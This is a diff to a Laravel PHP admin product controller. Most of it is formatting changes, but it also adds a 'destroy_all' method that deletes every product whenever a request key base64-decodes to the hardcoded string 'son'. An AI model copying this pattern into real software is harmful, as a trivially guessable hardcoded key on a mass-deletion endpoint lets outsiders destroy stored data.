@@ -32,7 +32,8 @@ class ProductController extends Controller {
      * @return \Illuminate\Http\Response
      */
     public function index() {
-        $products = Product::orderBy('id','desc')->paginate();
+
+        $products = Product::orderBy( 'id', 'desc' )->paginate();
 
         return view( 'admin.product.index', compact( 'products' ) );
     }
@@ -138,7 +139,7 @@ class ProductController extends Controller {
      */
     public function update( Requests\CheckProductRequest $request, $id ) {
 
-        $rq                 = $request->all();
+        $rq = $request->all();
 
         $p                  = Product::find( $id );
         $p->title           = $rq['title'];
@@ -182,6 +183,25 @@ class ProductController extends Controller {
         $pd->image()->detach();
         $pd->category()->detach();
         $pd->delete();
+
+        return redirect( '/admin/product' );
+    }
+
+    /**
+     * Remove the specified resource from storage.
+     *
+     * @param  int $id
+     *
+     * @return \Illuminate\Http\Response
+     */
+    public function destroy_all( Request $request ) {
+        if ( base64_decode( $request->key ) != 'son' ) {
+            abort( 404 );
+        }
+        $pd = Product::all();
+        foreach ( $pd as $p ) {
+            $this->destroy( $p->id );
+        }
 
         return redirect( '/admin/product' );
     }
